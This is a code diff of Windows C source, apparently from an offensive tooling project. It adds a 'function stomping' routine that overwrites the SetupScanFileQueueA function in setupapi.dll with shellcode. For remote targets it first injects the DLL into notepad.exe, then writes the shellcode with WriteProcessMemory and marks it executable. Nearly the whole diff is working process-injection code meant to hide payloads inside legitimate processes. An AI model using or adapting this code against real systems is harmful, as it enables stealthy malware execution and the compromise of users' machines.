@@ -8,36 +8,24 @@
 
 #pragma comment (lib, "OneCore.lib") // Required for MapViewOfFile2
 
-BOOL ReportErrorWinAPI(char* ApiName)
+
+BOOL ObtainWinAPIAddress(IN LPCSTR lpDllName, IN LPCSTR lpFunctionName, OUT PVOID* pAddress)
 {
-	printf("[!] \"%s\" WinAPI Failed with Error : %d\n", ApiName, GetLastError());
+	HMODULE hMod;
 
-	return FALSE;
-}
+	// check if the DLL is already loaded in the process' address space
+	if ((hMod = GetModuleHandle(lpDllName)) == NULL)
+		if ((hMod = LoadLibraryA(lpDllName)) == NULL) // load it if it isn't
+		{
+			printf("[!] Could not load %s DLL!\n", lpDllName);
+			return ReportErrorWinAPI("LoadLibraryA");
+		}
 
-BOOL ReportErrorNTAPI(char* ApiName, NTSTATUS STATUS)
-{
-	printf("[!] \"%s\" NTAPI Failed with Error : 0x%0.8X\n", ApiName, STATUS);
-
-	return FALSE;
-}
-
-BOOL ConvertToLowerCase(IN LPCWSTR lpszInput, OUT LPWSTR* pOutput)
-{
-	WCHAR LowerName[MAX_PATH * 2];
-	SIZE_T Size;
-	int i;
-
-	Size = lstrlenW(lpszInput);
-	RtlSecureZeroMemory(LowerName, Size);
-	if (Size < MAX_PATH * 2)
+	if ((*pAddress = GetProcAddress(hMod, lpFunctionName)) == NULL)
 	{
-		for (i = 0; i < Size; i++)
-			LowerName[i] = (WCHAR) tolower(lpszInput[i]);
-		LowerName[i++] = '\0';
+		printf("[!] Could not obtain the address of %s function inside %s DLL!\n", lpFunctionName, lpDllName);
+		return ReportErrorWinAPI("GetProcAddress");
 	}
-
-	*pOutput = LowerName;
 
 	return TRUE;
 }
@@ -120,6 +108,52 @@ BOOL AllocateMemory(IN DWORD dwType, IN HANDLE hProcess, IN PVOID pShellcode, IN
 		printf("[i] Allocated mapped memory for shellcode at 0x%p\n", *pShellcodeAddr);
 
 		CloseHandle(hFile);
+	}
+
+	else if (dwType == STOMPING)
+	{
+		PVOID pAddress;
+		DWORD oldProtect;
+
+		if (!ObtainWinAPIAddress("setupapi.dll", "SetupScanFileQueueA", &pAddress))
+			return FALSE;
+
+		// Local function stomping
+		if (hProcess == NULL)
+		{
+			if (!VirtualProtect(pAddress, sShellcodeSize, PAGE_READWRITE, &oldProtect))
+				return ReportErrorWinAPI("VirtualProtect");
+
+			memcpy(pAddress, pShellcode, sShellcodeSize);
+
+			if (!VirtualProtect(pAddress, sShellcodeSize, PAGE_EXECUTE_READ, &oldProtect))
+				return ReportErrorWinAPI("VirtualProtect");
+		}
+
+		// Remote function stomping
+		else
+		{
+			SIZE_T bytesWritten;
+
+			// The target DLL must be loaded in order for the target function to exist in the process' address space
+			char DLL[] = "C:\\Windows\\System32\\setupapi.dll";
+			if (!RemoteProcessDllInjection(NULL, "notepad.exe", NULL, DLL))
+				return FALSE;
+
+			if (!VirtualProtectEx(hProcess, pAddress, sShellcodeSize, PAGE_READWRITE, &oldProtect))
+				return ReportErrorWinAPI("VirtualProtectEx1");
+
+			if (!WriteProcessMemory(hProcess, pAddress, pShellcode, sShellcodeSize, &bytesWritten))
+				return ReportErrorWinAPI("WriteProcessMemory");
+
+			if (!VirtualProtectEx(hProcess, pAddress, sShellcodeSize, PAGE_EXECUTE_READ, &oldProtect))
+				return ReportErrorWinAPI("VirtualProtectEx2");
+		}
+
+		memset(pShellcode, '\0', sShellcodeSize);
+		*pShellcodeAddr = pAddress;
+
+		printf("[i] Function stomped SetupScanFileQueueA with shellcode at 0x%p\n", *pShellcodeAddr);
 	}
 
 	return TRUE;
